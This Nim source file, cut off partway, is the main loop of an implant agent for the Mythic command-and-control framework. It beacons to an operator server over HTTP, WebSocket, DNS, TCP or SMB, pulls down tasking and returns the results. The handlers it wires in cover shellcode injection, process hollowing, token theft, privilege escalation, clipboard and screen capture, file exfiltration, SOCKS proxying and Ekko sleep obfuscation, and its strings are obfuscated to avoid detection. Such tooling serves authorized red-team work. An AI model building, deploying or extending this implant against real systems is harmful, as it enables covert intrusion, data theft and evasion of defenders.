import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch]
import config
import global_data
import profiles/http_profile
import profiles/websocket_profile
import profiles/httpx_profile
import profiles/dns_profile
import profiles/tcp_profile

# Windows-only profiles
when defined(windows):
  import profiles/smb_profile

import utils/sysinfo
import utils/m_responses
import utils/debug
import utils/strenc
import utils/task_processor
import tasks/exit
import tasks/sleep
import tasks/ls
import tasks/download
import tasks/upload
import tasks/run
import tasks/whoami
import tasks/cat
import tasks/mkdir
import tasks/cp
import tasks/mv
import tasks/cd
import tasks/ps
import tasks/pwd
import tasks/rm
import tasks/pty
import tasks/socks
import tasks/rpfwd
import tasks/redirect
import tasks/getenv as taskGetenv
import tasks/connect

when defined(windows):
  import tasks/link

# Cross-platform commands
import tasks/portscan
import tasks/ifconfig
import tasks/netstat
import tasks/config as taskConfig
import tasks/pkill

# Windows-only commands
when defined(windows):
  import tasks/execute_assembly
  import tasks/inline_execute
  import tasks/powerpick
  import tasks/shinject
  import tasks/make_token
  import tasks/steal_token
  import tasks/rev2self
  import tasks/runas
  import tasks/getsystem
  import tasks/getprivs
  import tasks/listpipes
  import tasks/scshell
  import tasks/spawnto_x64
  import tasks/spawnto_x86
  import tasks/ppid
  import tasks/reg_query
  import tasks/reg_write_value
  import tasks/net_dclist
  import tasks/net_localgroup
  import tasks/net_localgroup_member
  import tasks/net_shares
  import tasks/screenshot
  import tasks/get_av
  import tasks/clipboard
  import tasks/clipboard_monitor
  import tasks/donut
  import tasks/inject_hollow

# Conditional imports for Windows-only features
when defined(windows):
  when defined(sleepObfuscationEkko):
    import utils/ekko

type
  BackgroundTaskType = enum
    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
    fileData: seq[byte]  # For execute-assembly file accumulation
    params: JsonNode  # Store original params for execute-assembly
  
  MonitoringTaskType* = enum
    mtClipboardMonitor, mtPortscan
  
  ProfileKind = enum
    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
  
  Profile = object
    case kind: ProfileKind
    of pkHttp:
      httpProfile: HttpProfile
    of pkWebSocket:
      wsProfile: WebSocketProfile
    of pkHttpx:
      httpxProfile: HttpxProfile
    of pkDns:
      dnsProfile: DnsProfile
    of pkTcp:
      tcpProfile: TcpProfile
    of pkSmb:
      when defined(windows):
        smbProfile: SmbProfile
  
  Agent* = ref object
    config: Config
    profile: Profile
    callbackUuid: string
    shouldExit*: bool
    sleepInterval: int
    jitter: int
    taskResponses: seq[JsonNode]
    backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state
    activeMonitoringTasks: Table[string, MonitoringTaskType]  # Task ID -> task type

# Profile helper procs
proc send(profile: var Profile, data: string, callbackUuid: string = ""): string =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.send(data, callbackUuid)
  of pkWebSocket:
    result = profile.wsProfile.send(data, callbackUuid)
  of pkHttpx:
    result = profile.httpxProfile.send(data, callbackUuid)
  of pkDns:
    result = profile.dnsProfile.send(data, callbackUuid)
  of pkTcp:
    result = profile.tcpProfile.send(data, callbackUuid)
  of pkSmb:
    when defined(windows):
      result = profile.smbProfile.send(data, callbackUuid)

proc setAesKey(profile: var Profile, key: seq[byte]) =
  case profile.kind
  of pkHttp:
    profile.httpProfile.setAesKey(key)
  of pkWebSocket:
    profile.wsProfile.setAesKey(key)
  of pkHttpx:
    profile.httpxProfile.setAesKey(key)
  of pkDns:
    profile.dnsProfile.setAesKey(key)
  of pkTcp:
    profile.tcpProfile.setAesKey(key)
  of pkSmb:
    when defined(windows):
      profile.smbProfile.setAesKey(key)

proc setAesDecKey(profile: var Profile, key: seq[byte]) =
  case profile.kind
  of pkHttp:
    profile.httpProfile.setAesDecKey(key)
  of pkWebSocket:
    profile.wsProfile.setAesDecKey(key)
  of pkHttpx:
    profile.httpxProfile.setAesDecKey(key)
  of pkDns:
    profile.dnsProfile.setAesDecKey(key)
  of pkTcp:
    profile.tcpProfile.setAesDecKey(key)
  of pkSmb:
    when defined(windows):
      profile.smbProfile.setAesDecKey(key)

proc hasAesKey(profile: Profile): bool =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.hasAesKey()
  of pkWebSocket:
    result = profile.wsProfile.hasAesKey()
  of pkHttpx:
    result = profile.httpxProfile.hasAesKey()
  of pkDns:
    result = profile.dnsProfile.hasAesKey()
  of pkTcp:
    result = profile.tcpProfile.hasAesKey()
  of pkSmb:
    when defined(windows):
      result = profile.smbProfile.hasAesKey()

proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.performKeyExchange()
  of pkWebSocket:
    result = profile.wsProfile.performKeyExchange()
  of pkHttpx:
    result = profile.httpxProfile.performKeyExchange()
  of pkDns:
    result = profile.dnsProfile.performKeyExchange()
  of pkTcp:
    result = profile.tcpProfile.performKeyExchange()
  of pkSmb:
    when defined(windows):
      result = profile.smbProfile.performKeyExchange()

proc newAgent*(): Agent =
  ## Create a new agent instance
  result = Agent()
  result.activeMonitoringTasks = initTable[string, MonitoringTaskType]()
  result.config = getConfig()
  # Initialize global data storage
  initGlobalData()
  
  debug &"[DEBUG] Agent: Initializing profile ({result.config.profile})..."
  
  # Initialize the correct profile based on config
  case result.config.profile
  of "websocket":
    result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
  of "httpx":
    result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
  of "dns":
    result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
  of "tcp":
    result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
  of "smb":
    when defined(windows):
      result.profile = Profile(kind: pkSmb, smbProfile: newSmbProfile())
    else:
      debug "[ERROR] SMB profile is only supported on Windows"
      quit(1)
  else:  # Default to HTTP for "http" or any other value
    result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
  
  debug "[DEBUG] Agent: Profile initialized successfully"
  
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  result.shouldExit = false
  result.sleepInterval = result.config.callbackInterval
  result.jitter = result.config.callbackJitter
  result.taskResponses = @[]
  result.backgroundTasks = initTable[string, BackgroundTaskState]()
  
  debug "[DEBUG] Agent: Parsing AESPSK configuration..."
  
  # If AESPSK is configured, parse and set it
  # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
  # For AESPSK-only mode (encryptedExchange=false), AESPSK is used for all communications
  if result.config.aesKey.len > 0:
    try:
      # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
      # enc_key: used for agent → server encryption
      # dec_key: used for server → agent decryption
      let aespskJson = parseJson(result.config.aesKey)
      let encKeyB64 = aespskJson["enc_key"].getStr()
      let decKeyB64 = aespskJson["dec_key"].getStr()
      let encKeyBytes = cast[seq[byte]](decode(encKeyB64))
      let decKeyBytes = cast[seq[byte]](decode(decKeyB64))
      result.profile.setAesKey(encKeyBytes)     # for encryption
      result.profile.setAesDecKey(decKeyBytes)  # for decryption
      if result.config.encryptedExchange:
        debug "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
      else:
        debug "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
    except:
      debug "[DEBUG] Failed to parse AESPSK: " & getCurrentExceptionMsg()
  else:
    debug "[DEBUG] Agent: No AESPSK configured"
  
  debug "[DEBUG] Agent: Initialization complete"

# Reuse buildCheckinInfo from task_processor module
proc buildCheckinMessage(): JsonNode =
  ## Build the initial checkin message (uses reusable function)
  result = buildCheckinInfo()
  
proc checkin*(agent: Agent): bool =
  ## Perform initial checkin with Mythic
  debug "[DEBUG] Starting checkin..."
  
  # Perform RSA key exchange if enabled (regardless of whether AESPSK is set)
  # AESPSK is used to encrypt the staging_rsa message, then replaced with session key
  if agent.config.encryptedExchange:
    debug "[DEBUG] RSA key exchange enabled - performing key exchange..."
    let (success, newUuid) = agent.profile.performKeyExchange()
    if not success:
      debug "[DEBUG] Key exchange failed"
      return false
    # Update callback UUID if server provided one
    if newUuid.len > 0:
      debug "[DEBUG] Updating callback UUID from " & agent.callbackUuid & " to " & newUuid
      agent.callbackUuid = newUuid
  
  # Build and send checkin
  let checkinMsg = buildCheckinMessage()
  let checkinStr = $checkinMsg
  
  debug "[DEBUG] Checkin message: " & checkinStr
  
  let response = agent.profile.send(checkinStr, agent.callbackUuid)
  
  if response.len == 0:
    debug "[DEBUG] Checkin failed - empty response"
    return false
  
  try:
    let respJson = parseJson(response)
    if respJson.hasKey("status") and respJson["status"].getStr() == "success":
      # Update callback UUID from server response
      let newCallbackUuid = respJson["id"].getStr()
      debug "[DEBUG] Checkin successful, updating callback UUID from " & agent.callbackUuid & " to " & newCallbackUuid
      agent.callbackUuid = newCallbackUuid
      return true
  except:
    debug "[DEBUG] Failed to parse checkin response: " & getCurrentExceptionMsg()
  
  return false

proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode], delegates: seq[JsonNode]] =
  ## Get tasking from Mythic
  ## Returns tasks, interactive messages, socks messages, rpfwd messages, and delegates
  ## Also updates agent.callbackUuid if a delayed checkin response is received
  let getTaskingMsg = %*{
    obf("action"): obf("get_tasking"),
    obf("tasking_size"): -1
  }
  
  debug "[DEBUG] Sending get_tasking with UUID: ", agent.callbackUuid
  let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
  
  debug "[DEBUG] get_tasking response length: ", response.len, " bytes"
  if response.len > 0 and response.len < 200:
    debug "[DEBUG] get_tasking response: ", response
  
  if response.len == 0:
    return (@[], @[], @[], @[], @[])
  
  var tasks: seq[JsonNode] = @[]
  var interactive: seq[JsonNode] = @[]
  var socks: seq[JsonNode] = @[]
  var rpfwd: seq[JsonNode] = @[]
  var delegates: seq[JsonNode] = @[]
  
  try:
    let respJson = parseJson(response)
    
    if respJson.hasKey(obf("tasks")):
      tasks = respJson[obf("tasks")].getElems()
      debug "[DEBUG] Received " & $tasks.len & " task(s)"
    
    if respJson.hasKey(obf("interactive")):
      interactive = respJson[obf("interactive")].getElems()
      debug "[DEBUG] Received " & $interactive.len & " interactive message(s)"
    
    if respJson.hasKey(obf("socks")):
      socks = respJson[obf("socks")].getElems()
      debug "[DEBUG] Received " & $socks.len & " socks message(s)"
    
    if respJson.hasKey(obf("rpfwd")):
      rpfwd = respJson[obf("rpfwd")].getElems()
      debug "[DEBUG] Received " & $rpfwd.len & " rpfwd message(s)"
    
    if respJson.hasKey(obf("delegates")):
      delegates = respJson[obf("delegates")].getElems()
      debug "[DEBUG] Received " & $delegates.len & " delegate message(s)"
    
    return (tasks, interactive, socks, rpfwd, delegates)
  except:
    debug "[DEBUG] Failed to parse tasking: " & getCurrentExceptionMsg()
    return (@[], @[], @[], @[], @[])



proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
  ## Process interactive messages (PTY input from Mythic)
  for msg in interactive:
    let taskId = msg[obf("task_id")].getStr()
    debug "[DEBUG] Processing interactive message for task " & taskId
    
    # Create array with single message for handler
    let response = handlePtyInteractive(taskId, @[msg])
    if response.len > 0:
      agent.taskResponses.add(response)

proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
  ## Process SOCKS messages (data forwarding from Mythic)
  if socksMessages.len > 0:
    debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
    
    # Handle all SOCKS messages and get responses to send back
    let responses = handleSocksMessages(socksMessages)
    for response in responses:
      # Wrap each SOCKS message in the format expected by postResponses
      agent.taskResponses.add(%*{obf("socks"): [response]})

proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
  ## Process RPfwd messages (data forwarding from Mythic)
  if rpfwdMessages.len > 0:
    debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
    
    # Handle all RPfwd messages and get responses to send back
    let responses = handleRpfwdMessages(rpfwdMessages)
    for response in responses:
      # Wrap each RPfwd message in the format expected by postResponses
      agent.taskResponses.add(%*{obf("rpfwd"): [response]})

proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
  ## Process delegate messages (P2P agent communications)
  ## Delegates are messages from Mythic that need to be forwarded to linked P2P agents
  if delegates.len > 0:
    debug "[DEBUG] Processing " & $delegates.len & " delegate message(s)"
    
    # Forward delegates to appropriate linked agents via their connection
    for delegate in delegates:
      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
        let uuid = delegate[obf("uuid")].getStr()
        let message = delegate[obf("message")].getStr()
        debug "[DEBUG] Delegate message for linked agent: ", uuid
        
        # Try to forward to connect connection (TCP)
        if not forwardDelegateToConnect(uuid, message):
          # Try to forward to link connection (SMB - Windows only)
          when defined(windows):
            if not forwardDelegateToLink(uuid, message):
              debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
          else:
            debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
      else:
        debug "[DEBUG] Malformed delegate message - missing uuid or message"

proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
  ## Process received tasks using the unified task_processor
  for task in tasks:
    let taskId = task[obf("id")].getStr()
    let command = task[obf("command")].getStr()
    
    # Check if this is a background task response (download/upload continuation)
    # These are forwarded to background threads in postResponses(), so skip here
    if command == obf("background_task"):
      debug "[DEBUG] Background task message (will be forwarded in postResponses): " & taskId
      continue
    
    # Parse parameters - Mythic sends it as a JSON string
    var params = newJObject()
    if task.hasKey(obf("parameters")):
      let paramStr = task[obf("parameters")].getStr()
      if paramStr.len > 0:
        try:
          params = parseJson(paramStr)
        except:
          debug "[DEBUG] Failed to parse parameters: " & paramStr
    
    # Execute task using unified task_processor
    let execResult = executeTask(taskId, command, params)
    
    # Handle special cases based on result flags
    if execResult.shouldExit:
      agent.shouldExit = true
    
    # Handle sleep command specially (needs to modify agent state)
    if command == obf("sleep"):
      let sleepResult = executeSleep(params, agent.sleepInterval, agent.jitter)
      sleepResult[obf("task_id")] = %taskId
      agent.taskResponses.add(sleepResult)
      continue
    
    # Handle background tasks that need state tracking
    if execResult.needsBackgroundTracking:
      agent.taskResponses.add(execResult.response)
      
      case command
      of obf("download"):
        var state = BackgroundTaskState(
          taskType: btDownload,
          path: params[obf("path")].getStr(),
          fileId: "",
          totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
          currentChunk: 0
        )
        agent.backgroundTasks[taskId] = state
      
      of obf("upload"):
        let uploadPath = if execResult.response.hasKey(obf("upload")):
          execResult.response[obf("upload")][obf("full_path")].getStr()
        else:
          params[obf("remote_path")].getStr()
        
        var state = BackgroundTaskState(
          taskType: btUpload,
          path: uploadPath,
          fileId: params[obf("file")].getStr(),
          totalChunks: 0,
          currentChunk: 1
        )
        agent.backgroundTasks[taskId] = state
      
      of obf("execute_assembly"):
        when defined(windows):
          var state = BackgroundTaskState(
            taskType: btExecuteAssembly,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
      
      of obf("inline_execute"):
        when defined(windows):
          var state = BackgroundTaskState(
            taskType: btInlineExecute,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
      
      of obf("shinject"):
        when defined(windows):
          var state = BackgroundTaskState(
            taskType: btShinject,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
      
      of obf("donut"):
        when defined(windows):
          var state = BackgroundTaskState(
            taskType: btDonut,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
      
      of obf("inject_hollow"):
        when defined(windows):
          var state = BackgroundTaskState(
            taskType: btInjectHollow,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
      
      of obf("screenshot"):
        when defined(windows):
          # Screenshot doesn't use BackgroundTaskState, handled elsewhere
          discard
      
      else:
        discard
      
      continue
    
    # Handle tasks that need monitoring (pty, socks, rpfwd, connect, etc.)
    # These return status="processing" and don't complete immediately
    if execResult.response.hasKey(obf("status")):
      let status = execResult.response[obf("status")].getStr()
      if status == obf("processing"):
        agent.taskResponses.add(execResult.response)
        continue
    
    # Handle monitoring tasks (clipboard_monitor, portscan)
    case command
    of obf("clipboard_monitor"):
      when defined(windows):
        agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
    of obf("portscan"):
      agent.activeMonitoringTasks[taskId] = mtPortscan
    else:
      discard
    
    # Add response for all other tasks
    agent.taskResponses.add(execResult.response)
    

proc checkBackgroundTasks*(agent: var Agent) =
  ## Check all active monitoring tasks (clipboard_monitor, portscan)
  ## This gets called every loop iteration to keep background tasks responsive
  var completedTasks: seq[string] = @[]
  
  for taskId, taskType in agent.activeMonitoringTasks:
    var result: JsonNode = nil
    
    case taskType
    of mtClipboardMonitor:
      when defined(windows):
        result = checkClipboardMonitor(taskId)
    of mtPortscan:
      result = checkPortscan(taskId)
    
    if result != nil:
      agent.taskResponses.add(result)
      # If completed, mark for removal
      if result.hasKey(obf("completed")) and result[obf("completed")].getBool():
        completedTasks.add(taskId)
  
  # Remove completed tasks
  for taskId in completedTasks:
    agent.activeMonitoringTasks.del(taskId)

proc postResponses*(agent: var Agent) =
  ## Post task responses back to Mythic
  if agent.taskResponses.len == 0:
    return
  
  debug "[DEBUG] === POSTING RESPONSES ==="
  debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
  
  # Separate interactive, socks, rpfwd, and delegate messages from regular responses
  var regularResponses: seq[JsonNode] = @[]
  var interactiveMessages: seq[JsonNode] = @[]
  var socksMessages: seq[JsonNode] = @[]
  var rpfwdMessages: seq[JsonNode] = @[]
  var delegateMessages: seq[JsonNode] = @[]
  
  for resp in agent.taskResponses:
    if resp.hasKey(obf("interactive")):
      # Extract interactive messages and add to top-level array
      let taskId = resp[obf("task_id")].getStr()
      let messages = resp[obf("interactive")].getElems()
      for msg in messages:
        interactiveMessages.add(msg)
      
      # Don't add the response itself if it only has task_id and interactive
      # (i.e., it's purely for interactive messages)
      if resp.len > 2:  # More than just task_id and interactive
        var cleanResp = resp.copy()
        cleanResp.delete(obf("interactive"))
        regularResponses.add(cleanResp)
    elif resp.hasKey(obf("socks")):
      # Extract socks messages and add to top-level array
      let messages = resp[obf("socks")].getElems()
      for msg in messages:
        socksMessages.add(msg)
      # Don't add the socks wrapper to responses
    elif resp.hasKey(obf("rpfwd")):
      # Extract rpfwd messages and add to top-level array
      let messages = resp[obf("rpfwd")].getElems()
      for msg in messages:
        rpfwdMessages.add(msg)
      # Don't add the rpfwd wrapper to responses
    elif resp.hasKey(obf("delegates")):
      # Extract delegate messages and add to top-level array
      let messages = resp[obf("delegates")].getElems()
      for msg in messages:
        delegateMessages.add(msg)
      # Don't add the delegate wrapper to responses
    elif resp.hasKey(obf("edges")):
      # Pass through edge notifications (for link/unlink)
      regularResponses.add(resp)
    else:
      regularResponses.add(resp)
  
  # Build post_response message
  var postMsg = %*{
    obf("action"): obf("post_response"),
    obf("responses"): regularResponses
  }
  
  # Add interactive messages at top level if any
  if interactiveMessages.len > 0:
    postMsg[obf("interactive")] = %interactiveMessages
  
  # Add socks messages at top level if any
  if socksMessages.len > 0:
    postMsg[obf("socks")] = %socksMessages
  
  # Add rpfwd messages at top level if any
  if rpfwdMessages.len > 0:
    postMsg[obf("rpfwd")] = %rpfwdMessages
  
  # Add delegate messages at top level if any
  if delegateMessages.len > 0:
    postMsg[obf("delegates")] = %delegateMessages
    debug "[DEBUG] Sending ", delegateMessages.len, " delegate message(s) to Mythic"
  
  let response = agent.profile.send($postMsg, agent.callbackUuid)
  
  debug "[DEBUG] Responses posted successfully"
  
  agent.taskResponses = @[]
  
  # Handle background task responses (file_id, chunks, etc.) and delegates
  if response.len > 0:
    try:
      let respJson = parseJson(response)
      
      # Forward any delegates to connected P2P agents
      if respJson.hasKey(obf("delegates")):
        let delegates = respJson[obf("delegates")]
        for delegate in delegates:
          let delegateUuid = delegate[obf("uuid")].getStr()
          let delegateMessage = delegate[obf("message")].getStr()
          debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
          
          # Forward delegate message to the P2P agent FIRST (using old UUID)
          discard forwardDelegateToConnect(delegateUuid, delegateMessage)
          when defined(windows):
            discard forwardDelegateToLink(delegateUuid, delegateMessage)
          
          # THEN check if Mythic assigned a new UUID and re-key for future messages
          if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
            let newUuid = if delegate.hasKey(obf("new_uuid")): 
              delegate[obf("new_uuid")].getStr() 
            else: 
              delegate[obf("mythic_uuid")].getStr()
            
            if newUuid != delegateUuid:
              debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
              debug "[DEBUG] Re-keying connection for future messages"
              # Re-key the connection from old UUID to new UUID for future messages
              discard rekeyConnectConnection(delegateUuid, newUuid)
              when defined(windows):
                discard rekeyLinkConnection(delegateUuid, newUuid)
      
      if respJson.hasKey(obf("responses")):
        for taskResp in respJson[obf("responses")]:
          let taskId = taskResp[obf("task_id")].getStr()
          
          # Check if this response is for a background task
          if agent.backgroundTasks.hasKey(taskId):
            var state = agent.backgroundTasks[taskId]
            
            case state.taskType
            of btDownload:
              # Got file_id, now send chunks
              if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
                state.fileId = taskResp[obf("file_id")].getStr()
                agent.backgroundTasks[taskId] = state
                debug "[DEBUG] Download got file_id: ", state.fileId
              
              # Send next chunk
              if state.currentChunk < state.totalChunks:
                state.currentChunk += 1
                
                # Differentiate between file download and screenshot (in-memory data)
                let chunkResp = if state.fileData.len > 0:
                  # Screenshot - process from memory (Windows only)
                  when defined(windows):
                    processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                  else:
                    # Should never happen on non-Windows, but return error
                    %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
                else:
                  # File download - read from disk
                  processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
                
                agent.taskResponses.add(chunkResp)
                
                # Check if this was the last chunk
                if state.currentChunk >= state.totalChunks:
                  let completeMsg = if state.fileData.len > 0:
                    # Screenshot complete (Windows only)
                    when defined(windows):
                      completeScreenshot(taskId, state.fileId)
                    else:
                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
                  else:
                    # File download complete
                    completeDownload(taskId, state.fileId, state.path)
                  
                  agent.taskResponses.add(completeMsg)
                  agent.backgroundTasks.del(taskId)
                  debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
                else:
                  agent.backgroundTasks[taskId] = state
            
            of btUpload:
              # Process incoming chunks
              if taskResp.hasKey(obf("chunk_data")):
                let chunkData = taskResp[obf("chunk_data")].getStr()
                let totalChunks = taskResp[obf("total_chunks")].getInt()
                state.totalChunks = totalChunks
                
                let isFirstChunk = (state.currentChunk == 1)
                let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
                                                     state.currentChunk, chunkData, totalChunks, isFirstChunk)
                agent.taskResponses.add(uploadResp)
                
                if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                  agent.backgroundTasks.del(taskId)
                  debug "[DEBUG] Upload complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
            
            of btExecuteAssembly:
              when defined(windows):
                # Process incoming file chunks for execute-assembly
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let execResp = processExecuteAssemblyChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(execResp)
                  
                  if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Execute-assembly complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btInlineExecute:
              when defined(windows):
                # Process incoming file chunks for inline_execute (BOF)
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let bofResp = processInlineExecuteChunk(
                    taskId, state.params, chunkData, totalChunks,
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(bofResp)
                  
                  if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Inline_execute complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btShinject:
              when defined(windows):
                # Process incoming file chunks for shinject
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let injectResp = processShinjectChunk(
                    taskId, state.params, chunkData, totalChunks,
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(injectResp)
                  
                  if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Shinject complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btDonut:
              when defined(windows):
                # Process incoming file chunks for donut shellcode
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let donutResp = processDonutChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(donutResp)
                  
                  if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Donut complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btInjectHollow:
              when defined(windows):
                # Process incoming file chunks for inject_hollow shellcode
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let injectResp = processInjectHollowChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(injectResp)
                  
                  if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Inject hollow complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
    except:
      debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()

proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
  ## Calculate sleep time with jitter
  ## Works in milliseconds to preserve precision
  if jitterPercent == 0:
    return baseInterval
  
  # Work in milliseconds to avoid integer division precision loss
  let baseMs = baseInterval * 1000
  let jitterMs = rand(-baseMs * jitterPercent .. baseMs * jitterPercent) div 100
  let resultMs = baseMs + jitterMs
  
  # Convert back to seconds
  result = resultMs div 1000
  if result < 1:
    result = 1

proc sleep*(agent: Agent) =
  ## Sleep with jitter
  let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
  
  debug "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
         "s, jitter: ", agent.jitter, "%)"
  
  # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
  when defined(windows):
    when defined(sleepObfuscationEkko):
      if sleepTime > 2:
        debug "[DEBUG] Using Ekko sleep obfuscation"
        ekkoObf(sleepTime * 1000)
      else:
        debug "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
        os.sleep(sleepTime * 1000)
    else:
      os.sleep(sleepTime * 1000)
  else:
    os.sleep(sleepTime * 1000)

proc runAgent*() =
  ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
  ## This is the single source of truth for the agent's main loop logic
  
  let cfg = getConfig()
  
  debug "[DEBUG] runAgent: Starting agent initialization..."
  
  # Initialize random number generator for jitter
  randomize()
  
  debug "[DEBUG] runAgent: Random seed initialized"
  
  # Check killdate
  let now = now().format("yyyy-MM-dd")
  if now >= cfg.killdate:
    debug "[DEBUG] runAgent: Killdate reached, exiting"
    return
  
  debug "[DEBUG] runAgent: Creating agent instance..."
  
  # Initialize agent
  var agentInstance = newAgent()
  
  # TCP and SMB profiles are special - they run their own listener loops instead of normal agent loop
  if cfg.profile == "tcp":
    debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
    # TCP profile doesn't do normal checkin - clients connect to it
    # Run the TCP listener loop
    case agentInstance.profile.kind
    of pkTcp:
      waitFor agentInstance.profile.tcpProfile.start()
    else:
      discard
    return
  
  if cfg.profile == "smb":
    when defined(windows):
      debug "[DEBUG] runAgent: SMB profile detected, starting P2P listener"
